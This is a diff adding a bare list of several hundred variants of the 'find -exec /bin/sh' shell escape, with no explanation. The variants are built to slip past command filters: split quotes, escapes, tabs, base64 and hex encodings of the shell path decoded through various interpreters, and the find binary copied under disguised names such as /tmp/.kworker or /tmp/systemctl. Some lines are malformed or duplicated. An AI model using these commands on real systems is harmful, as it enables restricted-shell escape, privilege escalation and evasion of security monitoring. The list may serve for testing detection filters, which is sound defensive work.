@@ -1,0 +1,360 @@
+find . -exec /bin/'sh' \; -quit
+find . -exec /bin/s'h' \; -quit
+find . -exec /'bin'/sh \; -quit
+find . -exec /bi'n'/sh \; -quit
+find . -exec /b'in'/'sh' \; -quit
+find . -exec /bin/s''h \; -quit
+find . -exec /bin//sh \; -quit
+find . -exec //bin/sh \; -quit
+find . -exec //bin//sh \; -quit
+find . -exec /bin/sh \; -qu'it'
+find . -exec /bin/sh \; -q'u'it
+find . -exec /bin/sh \; -qu''it
+find . -exec /b''in/sh \; -quit
+find . -exec /b'i'n/sh \; -quit
+find . -exec /bi'n//sh \; -quit
+find . -exec /b"in"/s"h" \; -quit
+find . -exec "/bin/sh" \; -quit
+find . -exec /"bin"/"sh" \; -quit
+find . -exec /bi''n/sh \; -quit
+find . -exec /bin/sh \; -"quit"
+find . -exec /bin/s"h" \; -quit
+find . -exec /bin//s"h" \; -quit
+find . -exec /b'in'//s"h" \; -quit
+find . -exec /bin/sh \; -"q""uit"
+find . -exec /bin/sh \; -q"u"it
+find . -exec /bin/sh \; -qui"t"
+find . -exec /bin/sh \; -q'u''it'
+find . -exec /bin///sh \; -quit
+find . -exec /b"i"n/s"h" \; -quit
+find . -exec /bin/sh \; -qu\\it
+find . -exec /bin/s\\h \; -quit
+find . -exec /bin/\\sh \; -quit
+find . -exec /bi\\n/sh \; -quit
+find . -exec /b\\in/sh \; -quit
+find . -exec /b\\i\\n/sh \; -quit
+find . -exec /bin/sh \; -qui\\t
+find . -exec /bin/sh \; -q\\uit
+find . -exec /bin/sh \; -q\\u\\it
+find . -exec /bin\\sh \; -quit
+find . -exec /bin/\\s\\h \; -quit
+find . -exec /bin\\//sh \; -quit
+find . -exec /bin/\\'sh\\' \; -quit
+find . -exec /b"in"/sh \; -quit
+find . -exec /bi"n"/s"h" \; -quit
+find . -exec /bin/s"h" \; -qui"t"
+find . -exec /bin/sh \; -q\u\i\t
+find . -exec /b'i'n//s"h" \; -qu'it
+find . -exec /bin\\sh \; -qui"t"
+find . -exec /bin/sh \; -'q''u''i''t'
+find . -exec /bi"n"/sh \; -qu"it"
+find . -exec /bin/s"h" \; -q"ui"t
+find . -exec /b'in'/sh \; -"quit"
+find . -exec /b"i"n/"s"h \; -"quit"
+find . -exec "/bin/s"h \; -quit
+find . -exec //bin/s"h" \; -"quit"
+find . -exec //bi"n"//sh \; -quit
+find . -exec /bi'n'//s"h" \; -qu"it"
+find . -exec /b'in'//sh \; -qu'i't
+find . -exec /bin/s"h" \; -"qu"it"
+find . -exec /bin/sh \; -q"u"i"t"
+find ./ -exec /bin/sh \; -quit
+find /tmp -exec /bin/sh \; -quit
+find . -ok /bin/sh \; -quit
+find ./ -ok /bin/sh \; -quit
+find /tmp -ok /bin/sh \; -quit
+find . -exec /bin/sh \; -q""uit
+find . -exec /bin/sh \; --qui""t
+find . -exec /bin/sh \; $(echo -quit)
+find . -exec /bin/sh \; -${EMPTY}quit
+find . -exec /bin/s"h" \; -quit
+find . -exec /bin/'sh' \; -quit
+find . -exec /bin/s\\h \; -quit
+find . -exec /bin/sh \; --qu''it
+find . -exec /bin/sh \; -qu\it
+find . -exec /bin/sh \; -qui\t
+find . -exec /bin/sh \; -q\u\i\t
+find . -exec /b""in/sh \; -quit
+find . -exec /bi\\n/sh \; -quit
+find . -exec /bin/sh \; -qu''it
+find . -exec /bin/sh \; -qui$EMPTYt
+find . -exec /bin/sh \; -qui$(echo t)
+find . -exec /bin/sh \; -qui$((1+1-1))t
+find . -exec "$(which sh)" \; -quit
+find . -exec /bin/sh \; -qu\i\t
+find . -exec /bin/sh \; -qui\u\it
+find . -exec /bin/sh \; -qu''it
+find . -exec /bin/sh \; -qu"it"
+find . -exec /bin/sh \; -qui""t
+find . -exec /bin/sh \; "-quit"
+find . -exec /bin/sh \; --qu\t
+find . -exec /bin/bash \; -quit
+find . -exec /bin/dash \; -quit
+find . -exec /bin/zsh \; -quit
+find . -exec /bin/fish \; -quit
+find . -exec /bin/s"h" \; -q"u"it
+find . -exec /b'in'/sh \; -quit
+find . -exec /bi'n'/s"h" \; -quit
+find . -exec "/bin/sh" \; -quit
+find . -exec '"/bin/sh"' \; -quit
+find . -exec $(which sh) \; -quit
+find . -exec` /usr/bin/env sh `\; -quit
+find . -exec /bin/sh \; -q""u""i""t
+find . -exec /bin/sh \; --qu\t
+find . -exec /bin/sh \; -qui\t
+find . -exec /bin/sh \; -q\u\i\t
+find . -exec /bin/sh \; $(printf '%s' -quit)
+find . -exec /bin/sh \; "$(echo -quit)"
+find . -exec /bin/sh \; -q""uit
+find . -exec /bin/sh \; -qu""it
+find . -exec /bin/sh \; -qui""t
+find . -exec /bin/sh \; -qu""i""t
+find . -exec /bin/sh \; -qu""i""t""
+find . -exec /bin/sh \; '-quit'
+find . -exec /bin/sh \; "--quit"
+find . -exec /bin/sh \; -qu\u0069t
+find . -exec /bin/sh \; -\q\u\i\t
+find . -exec /bin/sh \; -q\u0069t
+find . -exec /bin/sh \; -qu\i\u\t
+find . -exec /bin/sh \; -q\u\i\u\t
+find . -exec /bin/sh \; --q\u0069t
+find -exec /bin/sh \; -quit
+find -quit -exec /bin/sh \;
+find -exec /bin/sh \;
+find -exec /bin/sh \; -print -quit
+find -exec /bin/sh \; -false
+find -exec /bin/sh \; -quit -maxdepth 1
+find -exec /bin/sh \; -quit -type f
+find -exec /bin/sh \; -quit -name "*"
+find -exec /bin/sh \; -quit -empty
+find -exec /bin/sh \; -quit -user $(whoami)
+find -exec /bin/sh \; -quit -group $(id -gn)
+find -exec /bin/sh \; -quit -size +0
+find -exec /bin/sh \; -quit -perm -111
+find -exec /bin/sh \; -quit -executable
+find -exec /bin/sh \; -quit -readable
+find -exec /bin/sh \; -quit -writable
+find -exec /bin/sh \; -quit -xtype f
+find -exec /bin/sh \; -quit -links 1
+find -exec /bin/sh \; -quit -iname "*.sh"
+find -exec /bin/sh \; -quit -mtime 0
+find -exec /bin/sh \; -quit -cmin -1
+find -exec /bin/sh \; -quit -amin -1
+find -exec /bin/sh \; -quit -anewer /etc/passwd
+find -exec /bin/sh \; -quit -samefile /etc/passwd
+find -exec /bin/sh \; -quit -nouser
+find -exec /bin/sh \; -quit -nogroup
+find -exec /bin/sh \; -quit -newerct "$(date)"
+find -exec /bin/sh \; -quit -fstype ext4
+find -exec /bin/sh \; -quit -depth
+find -exec /bin/sh \; -quit -ls
+find -exec /bin/sh \; -quit -mindepth 0
+find -exec /bin/sh \; -quit -maxdepth 99
+find -exec /bin/sh \; -quit -iname "*"
+find -exec /bin/sh \; -quit -path "/tmp"
+find -exec /bin/sh \; -quit -not -empty
+find -exec /bin/sh \; -quit -type d
+find -exec /bin/sh \; -quit -type l
+find -exec /bin/sh \; -quit -perm -777
+find -exec /bin/sh \; -quit -user root
+find -exec /bin/sh \; -quit -group root
+find -exec /bin/sh \; -quit -ctime -1
+find -exec /bin/sh \; -quit -atime -1
+find -exec /bin/sh \; -quit -empty -type f
+find -exec /bin/sh \; -quit -size 0c
+find -exec /bin/sh \; -quit -print
+find -exec /bin/sh \; -quit -name test.sh
+find -exec /bin/sh \; -quit -newer /etc/shadow
+find -exec /bin/sh \; -quit -ctime +0
+find -exec /bin/sh \; -quit -regex ".*"
+find -exec /bin/sh \; -quit -ls -type f
+find -exec /bin/sh \; -quit -ok echo {} \;
+find -exec /bin/sh \; -quit -ok /bin/true \;
+find -exec /bin/sh \; -quit -delete
+find -exec /bin/sh \; -quit -prune
+find -exec /bin/sh \; -quit -fprint /dev/null
+find -exec /bin/sh \; -quit -exec echo {} \;
+find -exec /bin/sh \; -quit -name "*sh" -print
+find -exec /bin/sh \; -quit -fls /dev/null
+find -exec /bin/sh \; -quit -samefile /bin/sh
+find -exec /bin/sh \; -quit -newerXY ac /bin/sh
+find . -exec /bin/sh \; -quit
+`find . -exec /tmp/k \; -quit` *(after copying sh to /tmp/k)*
+find . -exec /bin//sh \; -quit
+find . -exec /bin/./sh \; -quit
+find . -quit -exec /bin/sh \;
+find . -exec /bin/sh -quit \;
+find . -exec\t/bin/sh\t\;\t-quit
+find\t.\t-exec\t/bin/sh\t\;\t-quit
+find . -quit -exec /bin/sh \;
+`find . -exec /tmp/.hidden_sh \; -quit` *(after renaming sh)*
+find . -exec $(which sh) \; -quit
+find . -exec /usr/bin/env sh \; -quit
+find . -exec /usr/bin/sh \; -quit
+find -exec /bin/sh \; . -quit
+find -exec /bin/sh \; -quit .
+find . -exec /bin/s\h \; -quit
+find . -exec /b'in'/sh \; -quit
+find . -exec "/bin/sh" \; -quit
+find . -exec '/bin/sh' \; -quit
+`find . -exec /bin/sh \; -quit` *(mix of spaces and tabs)*
+find . -exec /bin/sh \; -quit
+`find . -exec $0 \; -quit` *(if script is sh)*
+`find . -exec ./sh \; -quit` *(if copied binary to current dir)*
+find . -exec /tmp/k -quit \;
+find . -exec /b\\in/sh \; -quit
+`find . -exec /bin/sh\ \; -quit` *(extra space escape)*
+`find . -exec /bin/sh \; -q\u0069t` *(unicode `quit`)*
+`find . -exec /bin/sh \; -qui\014t` *(form feed in `quit`)*
+find . -exec /bin/sh \; -q\u0069t
+`find . -exec /bin/sh \; -qu\tit` *(tab inside `quit`)*
+`find . -exec /tmp/shell \; -quit` *(after: `cp /bin/sh /tmp/shell`)*
+`find . -exec /dev/shm/s \; -quit` *(after: `cp /bin/sh /dev/shm/s`)*
+`find . -exec /var/tmp/x \; -quit` *(after: `cp /bin/sh /var/tmp/x`)*
+find . -exec /bin/sh\ \ \ \ \; -quit
+find . -exec /bin/sh \; \ -quit
+find . -exec\t/bin/sh\t\;\t-q\u0075it
+find . -exec /bin/sh \; -q\ uit
+find . -exec /bin/sh \; -quit
+find . -quit -exec /tmp/x \;
+find . -quit -exec /bin/sh \;
+find . -exec $(echo /bin/sh) \; -quit
+find . -exec` /bin/echo /bin/sh `\; -quit
+find . -exec "$SHELL" \; -quit
+find . -exec /bin/sh -c true \; -quit
+find . -exec sh \; -quit
+find . -exec /bin/s"h" \; -quit
+find . -exec /bi""n/sh \; -quit
+find . -exec /bin/'sh' \; -quit
+find . -exec "/bin/"sh \; -quit
+find . -exec //bin//sh \; -quit
+find . -exec /bin///sh \; -quit
+find . -exec /bin/sh$IFS\; -quit
+find . -exec /bin/sh </dev/null \; -quit
+find . -exec /bin/sh >/dev/null \; -quit
+find . -exec /bin/sh <<<"" \; -quit
+find / -exec /bin/sh \; -quit
+find /tmp -exec /bin/sh \; -quit
+find . -exec \"/bin/sh\" \; -quit
+find . -exec \'/bin/sh\' \; -quit
+find . -exec "`echo /bin/sh`" \; -quit
+find . -exec $(echo L2Jpbi9zaA== | base64 -d) \; -quit
+find . -exec $(printf '\x2f\x62\x69\x6e\x2f\x73\x68') \; -quit
+find . -exec $(printf '\057\142\151\156\057\163\150') \; -quit
+find . -exec $(echo 2f62696e2f7368 | xxd -r -p) \; -quit
+find . -exec $(perl -e 'print pack("H*","2f62696e2f7368")') \; -quit
+find . -exec $(python3 - <<<'import sys;sys.stdout.write(bytes.fromhex("2f62696e2f7368").decode())') \; -quit
+find . -exec $(echo L2Jpbi9zaA | base64 -d) \; -quit
+find . -exec $(printf '%b' '\x2f\x62\x69\x6e\x2f\x73\x68') \; -quit
+find . -exec $(awk 'BEGIN{printf "%c%c%c%c%c%c%c",47,98,105,110,47,115,104}') \; -quit
+find . -exec $(echo 057142151156057163150 | sed 's/../\\&/g' | xargs printf) \; -quit
+find . -exec $(perl -e 'print chr($_) for 47,98,105,110,47,115,104') \; -quit
+find . -exec $(python3 - <<<'print("".join(map(chr,[47,98,105,110,47,115,104])))') \; -quit
+find . -exec $(echo 2f62696e2f7368 | perl -pe 's/(..)/chr(hex($1))/ge') \; -quit
+find . -exec $(ruby -e 'print [47,98,105,110,47,115,104].pack("C*")') \; -quit
+find . -exec $(echo L2Jpbi9zaA== | openssl base64 -d) \; -quit
+find . -exec $(printf '\x2F\x62\x69\x6E\x2F\x73\x68') \; -quit
+find . -exec $(echo 2f62696e2f7368 | sed 's/\(..\)/\\x\1/g' | xargs printf) \; -quit
+find . -exec $(node -e 'process.stdout.write(Buffer.from("2f62696e2f7368","hex"))') \; -quit
+find . -exec $(lua -e 'io.write(string.char(47,98,105,110,47,115,104))') \; -quit
+find . -exec $(php -r 'echo pack("H*","2f62696e2f7368");') \; -quit
+find . -exec $(echo 47,98,105,110,47,115,104 | tr ',' '\n' | awk '{printf "%c",$1}') \; -quit
+find . -exec $(python3 - <<<'import binascii;print(binascii.unhexlify("2f62696e2f7368").decode())') \; -quit
+find . -exec $(echo L2Jpbi9zaA== | busybox base64 -d) \; -quit
+find . -exec $(printf '%c%c%c%c%c%c%c' 47 98 105 110 47 115 104) \; -quit
+find . -exec $(perl -MMIME::Base64 -e 'print decode_base64("L2Jpbi9zaA==")') \; -quit
+find . -exec $(echo 2f62696e2f7368 | fold -w2 | sed 's/^/\\x/' | xargs printf) \; -quit
+find . -exec $(python3 - <<<'print(bytes([47,98,105,110,47,115,104]).decode())') \; -quit
+find . -exec $(ruby -e 'puts "\x2f\x62\x69\x6e\x2f\x73\x68"') \; -quit
+find . -exec $(echo L2Jpbi9zaA== | perl -MMIME::Base64 -ne 'print decode_base64($_)') \; -quit
+find . -exec $(awk 'BEGIN{s="2f62696e2f7368";for(i=1;i<=length(s);i+=2)printf "%c",strtonum("0x"substr(s,i,2))}') \; -quit
+find . -exec $(echo 2f 62 69 6e 2f 73 68 | xxd -r -p) \; -quit
+find . -exec $(echo -n '/bin/sh' | od -An -tx1 | tr -d ' \n' | xxd -r -p) \; -quit
+find . -exec $(perl -e 'print "\x2f\x62\x69\x6e\x2f\x73\x68"') \; -quit
+find . -exec $(bash -c 'echo L2Jpbi9zaA== | base64 -d') \; -quit
+find . -exec $(dd if=<(echo L2Jpbi9zaA==) bs=1 skip=0 2>/dev/null | base64 -d) \; -quit
+find . -exec $(cat <<< "L2Jpbi9zaA==" | base64 -d) \; -quit
+find . -exec $(python3 -c 'print(bytes.fromhex("2f62696e2f7368").decode())') \; -quit
+find . -exec $(perl -e '$_="2f62696e2f7368";s/(..)/print chr hex $1/ge') \; -quit
+find . -exec $(echo "0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68" | xargs printf "%b") \; -quit
+find . -exec $(echo '/bin/sh' | tr -d '/' | sed 's/^/\/&/') \; -quit
+find . -exec $(echo -ne '\057\142\151\156\057\163\150') \; -quit
+find . -exec $(bash -c 'echo -e "\x2f\x62\x69\x6e\x2f\x73\x68"') \; -quit
+find . -exec $(awk 'BEGIN{ORS="";for(i=1;i<=7;i++)printf "%c",47+(i!=1)*((i==2)*51+(i==3)*57+(i==4)*63+(i==5)*48+(i==6)*68+(i==7)*57)}') \; -quit
+find . -exec $(cat <<< $(echo 2f62696e2f7368) | xxd -r -p) \; -quit
+find . -exec $(bash -c "$(echo 'ZWNobyAiL2Jpbi9zaCIK' | base64 -d)") \; -quit
+find . -exec $(echo $(echo 2f62696e2f7368) | sed 's/../\\x&/g' | xargs printf) \; -quit
+find . -exec $(perl -E 'say join "", map {chr hex} unpack "(A2)*", "2f62696e2f7368"') \; -quit
+find . -exec $(php -r 'echo "\x2f\x62\x69\x6e\x2f\x73\x68";') \; -quit
+find . -exec $(lua -e 'io.write("\x2f\x62\x69\x6e\x2f\x73\x68")') \; -quit
+find . -exec $(bash -c 'echo 2f62696e2f7368 | xxd -r -p') \; -quit
+find . -exec $(printf '%s' '2f62696e2f7368' | xxd -r -p) \; -quit
+find . -exec $(node -p "Buffer.from('2f62696e2f7368', 'hex').toString()") \; -quit
+find . -exec $(perl -e 'print pack("C*",47,98,105,110,47,115,104)') \; -quit
+find . -exec $(python3 -c 'import codecs;print(codecs.decode("2f62696e2f7368","hex").decode())') \; -quit
+find . -exec $(bash -c 'echo "\057\142\151\156\057\163\150"') \; -quit
+find . -exec $(python3 -c 'import base64; print(base64.b64decode("L2Jpbi9zaA==").decode())') \; -quit
+find . -exec $(xxd -r -p <<< 2f62696e2f7368) \; -quit
+find . -exec $(perl -e '$_="2f62696e2f7368";s/(..)/chr hex $1/ge;print') \; -quit
+find . -exec $(awk 'BEGIN{printf "%c%c%c%c%c%c%c",47,98,105,110,47,115,104}') \; -quit
+find . -exec $(bash -c "$(echo ZmluZCAuIC1leGVjICQocHJpbnRmICcvYmluL3NoJykK | base64 -d)") \; -quit
+cp /usr/bin/find /tmp/t; /tmp/t . -exec /bin/sh \; -quit
+cp $(which find) /tmp/x; /tmp/x . -exec /bin/sh \; -quit
+cp /usr/bin/find /dev/shm/f; /dev/shm/f . -exec /bin/sh \; -quit
+cp /bin/find /tmp/myapp; /tmp/myapp . -exec /bin/sh \; -quit
+cp /usr/bin/find /home/user/.find2; /home/user/.find2 . -exec /bin/sh \; -quit
+cp $(which find) /tmp/shellme; /tmp/shellme . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/ls; /tmp/ls . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/grep; /tmp/grep . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/cron; /tmp/cron . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/finder; /tmp/finder . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/syscheck; /tmp/syscheck . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/test; /tmp/test . -exec /bin/sh \; -quit
+cp /usr/bin/find /var/tmp/a; /var/tmp/a . -exec /bin/sh \; -quit
+cp /usr/bin/find /dev/shm/.tmpx; /dev/shm/.tmpx . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/init; /tmp/init . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/find2; /tmp/find2 . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/findex; /tmp/findex . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.hidden; /tmp/.hidden . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/startup; /tmp/startup . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/myls; /tmp/myls . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.cache; /tmp/.cache . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/dmidecode; /tmp/dmidecode . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/shiny; /tmp/shiny . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/checker; /tmp/checker . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/backup; /tmp/backup . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/logrotate; /tmp/logrotate . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/pinger; /tmp/pinger . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/whoami; /tmp/whoami . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/filelist; /tmp/filelist . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/patcher; /tmp/patcher . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/update; /tmp/update . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/u; /tmp/u . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.svc; /tmp/.svc . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/dbus; /tmp/dbus . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.bash_history; /tmp/.bash_history . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/mgmt; /tmp/mgmt . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/diag; /tmp/diag . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/systemctl; /tmp/systemctl . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/rand; /tmp/rand . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/libtest; /tmp/libtest . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/rc.local; /tmp/rc.local . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/service; /tmp/service . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/bootlog; /tmp/bootlog . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/lsattr; /tmp/lsattr . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/loadavg; /tmp/loadavg . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/netcfg; /tmp/netcfg . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/vuln; /tmp/vuln . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.kworker; /tmp/.kworker . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/agent; /tmp/agent . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/binutils; /tmp/binutils . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/ioctl; /tmp/ioctl . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/collector; /tmp/collector . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/initctl; /tmp/initctl . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/modprobe; /tmp/modprobe . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/userd; /tmp/userd . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/kmod; /tmp/kmod . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/ifplugd; /tmp/ifplugd . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/installer; /tmp/installer . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/.uuidd; /tmp/.uuidd . -exec /bin/sh \; -quit
+cp /usr/bin/find /tmp/sysinfo; /tmp/sysinfo . -exec /bin/sh \; -quit
